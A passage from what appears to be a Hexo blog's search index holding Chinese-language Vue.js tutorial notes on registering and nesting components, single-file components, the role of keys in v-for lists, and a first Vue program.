class="string">&quot;中国&quot;</span>,</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><h3 id="第二步注册组件"><a href="#第二步注册组件" class="headerlink" title="第二步注册组件"></a>第二步注册组件</h3><p>在vm实例components配置项中注册</p><p><code>xuexiao是school组件的名字</code></p><p>局部注册</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">   <span class="attr">el</span>:<span class="string">&quot;#root&quot;</span>,</span><br><span class="line">   <span class="comment">// 第二部 注册组件 局部注册, </span></span><br><span class="line">   <span class="attr">components</span>:&#123;</span><br><span class="line">       <span class="attr">xuexiao</span>:school,</span><br><span class="line">       <span class="attr">xueshen</span>:student</span><br><span class="line">   &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="第三步配置模板"><a href="#第三步配置模板" class="headerlink" title="第三步配置模板"></a>第三步配置模板</h3><p>需要在组件中配置模板字符串</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> student = Vue.extend(&#123;</span><br><span class="line">    <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">studentName</span>:<span class="string">&quot;张三&quot;</span>,</span><br><span class="line">            <span class="attr">age</span>:<span class="number">18</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">template</span>: <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;学生姓名: &#123;&#123;studentName&#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;学生年龄: &#123;&#123;age&#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="第四步编写页面标签"><a href="#第四步编写页面标签" class="headerlink" title="第四步编写页面标签"></a>第四步编写页面标签</h3><p>这个标签名是在vm实例中注册时对应的组件名称</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span> </span><br><span class="line">      <span class="tag">&lt;<span class="name">xuexiao</span>&gt;</span><span class="tag">&lt;/<span class="name">xuexiao</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">xueshen</span>&gt;</span><span class="tag">&lt;/<span class="name">xueshen</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202202231350867.png"></p><h3 id="定义全局组件"><a href="#定义全局组件" class="headerlink" title="定义全局组件"></a>定义全局组件</h3><p>定义个组件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> hello = Vue.extend(&#123;</span><br><span class="line">    <span class="attr">template</span>: <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;你好啊&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        `</span></span><br><span class="line">    ,</span><br><span class="line">    <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">name</span>:<span class="string">&#x27;Tom&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>然后在全局中注册</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vue.component(<span class="string">&#x27;hello&#x27;</span>, hello);</span><br></pre></td></tr></table></figure><p>全局注册完毕后将不需要注册到vm实例, 直接拿到组件名到页面中使用即可</p><h3 id="简写组件"><a href="#简写组件" class="headerlink" title="简写组件"></a>简写组件</h3><p>可以简写</p><p><code>let school = Vue.extend(options) 可简写未 const school = options</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> hello2 = &#123;</span><br><span class="line">    <span class="attr">template</span>: <span class="string">`</span></span><br><span class="line"><span class="string">                &lt;div&gt;</span></span><br><span class="line"><span class="string">                    &lt;h2&gt;你好啊&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">                `</span></span><br><span class="line">            ,</span><br><span class="line">            <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;</span><br><span class="line">                    <span class="attr">name</span>:<span class="string">&#x27;哈利&#x27;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;</span><br><span class="line">Vue.component(<span class="string">&#x27;hello2&#x27;</span>, hello2);</span><br></pre></td></tr></table></figure><h3 id="组件嵌套"><a href="#组件嵌套" class="headerlink" title="组件嵌套"></a>组件嵌套</h3><p>定义一个父组件和定义一个子组件, 在父组件中注册子组件，再将父组件注册到vm中</p><p>1、定义一个父组件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> school = Vue.extend(&#123;</span><br><span class="line">      </span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2、定义一个子组件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> student = Vue.extend(&#123;</span><br><span class="line">            <span class="attr">template</span>:<span class="string">`</span></span><br><span class="line"><span class="string">                    &lt;div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h2&gt;学生姓名: &#123;&#123;studentName&#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">                        &lt;h2&gt;学生年龄: &#123;&#123;age&#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">            `</span>,</span><br><span class="line">            <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;</span><br><span class="line">                    <span class="attr">studentName</span>:<span class="string">&quot;张三&quot;</span>,</span><br><span class="line">                        <span class="attr">age</span>:<span class="number">18</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">components</span>:&#123;</span><br><span class="line"></span><br><span class="line">            &#125;,</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><p>3、在父组件中注册子组件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> school = Vue.extend(&#123;</span><br><span class="line">         <span class="attr">template</span>:<span class="string">`</span></span><br><span class="line"><span class="string">                &lt;div&gt;</span></span><br><span class="line"><span class="string">                    &lt;h2&gt;学校名称: &#123;&#123;schoolName&#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">                    &lt;h2&gt;学校地址: &#123;&#123;address&#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">                    &lt;student&gt;&lt;/student&gt;// 使用子组件</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">         `</span>,</span><br><span class="line">         <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">             <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">schoolName</span>: <span class="string">&quot;理工&quot;</span>,</span><br><span class="line">                    <span class="attr">address</span>: <span class="string">&quot;中国&quot;</span>,</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;,</span><br><span class="line">         <span class="attr">components</span>:&#123;</span><br><span class="line"></span><br><span class="line">         &#125;,</span><br><span class="line">         <span class="attr">components</span>:&#123; </span><br><span class="line">            student <span class="comment">// 注册子组件</span></span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">     &#125;);</span><br></pre></td></tr></table></figure><p>4、在vm中注册父组件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    <span class="attr">template</span>:<span class="string">`</span></span><br><span class="line"><span class="string">       &lt;school&gt;&lt;/school&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">   <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span><br><span class="line">   <span class="attr">components</span>:&#123;</span><br><span class="line">       school <span class="comment">// 注册父组件</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在vue开发工具中实现了组件的嵌套</p><p>效果</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202202231457001.png"></p><h2 id="单文件组件"><a href="#单文件组件" class="headerlink" title="单文件组件"></a>单文件组件</h2><blockquote><p>一个文件包含有1个组件</p></blockquote><p>第一步</p><p>创建后缀为vue的组件</p><p>Shcool.vue结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;template lang=&quot;&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;!-- 组件结构 --&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    // 组件交互相关的代码</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;&quot;&gt;</span><br><span class="line">    /* 组件的样式 */</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>代码示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;template lang=&quot;&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;dome&quot;&gt;</span><br><span class="line">        &lt;!-- 组件结构 --&gt;</span><br><span class="line">            &lt;h2&gt;学校名称: &#123;&#123;schoolName&#125;&#125;&lt;/h2&gt;</span><br><span class="line">            &lt;h2&gt;学校地址: &#123;&#123;address&#125;&#125;&lt;/h2&gt;</span><br><span class="line">            &lt;button @click=&quot;alters&quot;&gt; 点我弹窗 &lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    // 组件交互相关的代码</span><br><span class="line">    export default &#123;</span><br><span class="line">            name:&#x27;School&#x27;, // 为开发者标签命名</span><br><span class="line">            data() &#123;    </span><br><span class="line">                return &#123;</span><br><span class="line">                    schoolName: &quot;理工&quot;,</span><br><span class="line">                    address: &quot;中国&quot;,</span><br><span class="line">                    studentName:&quot;张三&quot;,</span><br><span class="line">                    age:18</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            methods: &#123;</span><br><span class="line">                alters()&#123;</span><br><span class="line">                    alert(this.schoolName)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            template: `</span><br><span class="line">                &lt;div&gt;</span><br><span class="line">                    &lt;h2&gt;学校名称: &#123;&#123;schoolName&#125;&#125;&lt;/h2&gt;</span><br><span class="line">                    &lt;h2&gt;学校地址: &#123;&#123;address&#125;&#125;&lt;/h2&gt;</span><br><span class="line">                    &lt;button @click=&quot;alters&quot;&gt; 点我弹窗 &lt;/button&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                `</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;&quot;&gt;</span><br><span class="line">    /* 组件的样式 */</span><br><span class="line">    .dome&#123;</span><br><span class="line">        background-color: aqua;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Key的原理和作用</title>
      <link href="/2022/02/23/V-for%E5%BE%AA%E7%8E%AFKey%E4%BD%9C%E7%94%A8%E5%92%8C%E5%8E%9F%E7%90%86/"/>
      <url>/2022/02/23/V-for%E5%BE%AA%E7%8E%AFKey%E4%BD%9C%E7%94%A8%E5%92%8C%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<center> <h1>    Vue列表Key的原理和作用    </h1> </center><h1 id="key值的作用"><a href="#key值的作用" class="headerlink" title="key值的作用"></a>key值的作用</h1><p><strong>key值大多情况下使用在循环语句中，从本质来讲主要作用大概有以下两点：</strong></p><ol><li>主要用在 Vue 的虚拟 DOM 算法，在新旧 nodes 对比时辨识 VNodes，相当于唯一标识ID。</li><li>Vue 会尽可能高效地渲染元素，通常会复用已有元素而不是从头开始渲染， 因此使用key值可以提高渲染效率，同理，改变某一元素的key值会使该元素重新被渲染。</li><li>当没有指定key的时候Vue将默认会将index作为key进行传输</li></ol><h1 id="虚拟DOM中的key的作用"><a href="#虚拟DOM中的key的作用" class="headerlink" title="虚拟DOM中的key的作用"></a>虚拟DOM中的key的作用</h1><p>key时虚拟DOM对象的标识，当数据发生改变时，Vue会根据<code>新数据</code>生成<code>新的虚拟DOM</code>,</p><p>随后Vue进行<code>新虚拟DOM</code>与<code>旧虚拟DOM</code>的差异进行比较</p><h1 id="对比规则"><a href="#对比规则" class="headerlink" title="对比规则"></a>对比规则</h1><p>旧虚拟DOM找到与新虚拟DOM相同的Key</p><ul><li><p>若虚拟DOM中内容没有改变直接使用之前的真实DOM</p></li><li><p>虚拟DOM中内容发生改变，则生成新的真实DOM随后替换掉页面中之前的真实DOM</p></li></ul><p>旧虚拟DOM中未找到与新虚拟DOM相同的key</p><ul><li>创建新的真实DOM，随后渲染到网页中</li></ul><h1 id="用index作为key引发的问题"><a href="#用index作为key引发的问题" class="headerlink" title="用index作为key引发的问题"></a>用index作为key引发的问题</h1><p>若对数据进行逆序添加、逆序删除等破坏顺序操作</p><ul><li>会产生没有必要的真实DOM更新 ===&gt; 界面效果没问题，但是效率略低</li></ul><p>如果结构还包含输入类的DOM</p><ul><li>会产生错误的DOM更新 ===&gt; 界面有问题</li></ul><h1 id="开发怎么选择key"><a href="#开发怎么选择key" class="headerlink" title="开发怎么选择key"></a>开发怎么选择key</h1><ul><li><p>最好使用每一条数据唯一的标识作为key比如id、手机号、身份证号、学号等唯一标识 </p></li><li><p>如果不存在对数据的逆序添加删除等破坏顺序操作，仅用于渲染列表用于展示那使用index作为key是没有问题的</p></li></ul><p>当index作为key时没有办法的到较好的复用，当标签里面出现输入框的时候将会出现问题</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202202231140170.png"></p><p>当惟一标识号id作为key时,  可以高效率的复用当标签内出现输入框的时候不会出现问题</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202202231146045.png"></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue基础</title>
      <link href="/2022/02/22/Vue%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/02/22/Vue%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<center> <h1>Vue基础</h1></center><h1 id="Vue概述"><a href="#Vue概述" class="headerlink" title="Vue概述"></a>Vue概述</h1><ul><li><p>Vue是一套用于构建用户界面的<strong>渐进式框架</strong>。与其它大型框架不同的是，Vue 被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合。另一方面，当与<a href="https://cn.vuejs.org/v2/guide/single-file-components.html">现代化的工具链</a>以及各种<a href="https://github.com/vuejs/awesome-vue#libraries--plugins">支持类库</a>结合使用时，Vue 也完全能够为复杂的单页应用提供驱动</p></li><li><p>作者是我们中国开发者<code>尤雨溪</code></p></li><li><p>遵循 MVVM 模式 </p></li><li><p>编码简洁, 体积小, 运行效率高, 适合移动/PC 端开发 </p></li><li><p>它本身只关注 UI, 也可以引入其它第三方库开发项目</p></li></ul><p>框架关联</p><ul><li>借鉴 Angular 的模板和数据绑定技术</li><li>借鉴 React 的组件化和虚拟 DOM 技术</li></ul><p> Vue 周边库</p><ol><li>vue-cli: vue 脚手</li><li>vue-resource: 请求</li><li>axios: 异步请求</li><li>vue-router: 路由</li><li>vuex: 状态管理</li><li>vuex: 状态管理</li></ol><p>采用<strong>组件化</strong>模式，提高代码复用率，且让代码更好维护</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202202221645633.png"></p><p><strong>声明式</strong>编码，让编码人员无需直接操作DOM，提高开发效率</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202202221645044.png"></p><p>使用<strong>虚拟DOM</strong>+优秀的<strong>Diff算法</strong>，尽量复用DOM节点</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202202221646738.png"></p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202202221646029.png"></p><h1 id="搭建Vue开发环境"><a href="#搭建Vue开发环境" class="headerlink" title="搭建Vue开发环境"></a>搭建Vue开发环境</h1><p>vue.js的下载方式：</p><ul><li>可以引用在线的vue.js；</li><li>可以离线下载vue.js；</li><li>npm包资源管理器，可以下载vue.js</li></ul><p>直接用script引入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="第一个vue程序"><a href="#第一个vue程序" class="headerlink" title="第一个vue程序"></a>第一个vue程序</h1><p>想让Vue工作，就必须创建一个Vue实例，且要传入一个<strong>配置对象</strong></p><p>root容器里的代码依然符合HTML规范，只不过混入了一些特殊的Vue语法</p><p>root容器里的代码被称为<strong>Vue模板</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="comment">&lt;!-- 准备好一个容器 --&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> =<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello,&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="comment">//创建Vue实例,得到 ViewModel   </span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="attr">el</span>: <span class="string">&#x27;#root&#x27;</span>, <span class="comment">//el用于指定当前Vue实例为哪个容器服务，值通常为CSS选择器字符串</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="attr">data</span>: &#123; <span class="comment">//data中用于存储数据，数据供el所指定的容器去使用，值暂时先写成一个对象</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="attr">name</span>:<span class="string">&#x27;你好世界&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="attr">methods</span>: &#123;&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ul><li>Vue实例和模板是<strong>一一对应</strong>的关系，以下两段代码中，均无法正常解析渲染</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;root&quot;</span>&gt;</span><br><span class="line">        <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello,&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello,&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">el</span>: <span class="string">&#x27;.root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">data</span>: &#123; </span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="attr">name</span>:<span class="string">&#x27;你好世界&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">methods</span>: &#123;&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;);</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;root&quot;</span>&gt;</span><br><span class="line">        <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello,&#123;&#123;name&#125;&#125;,&#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">el</span>: <span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">data</span>: 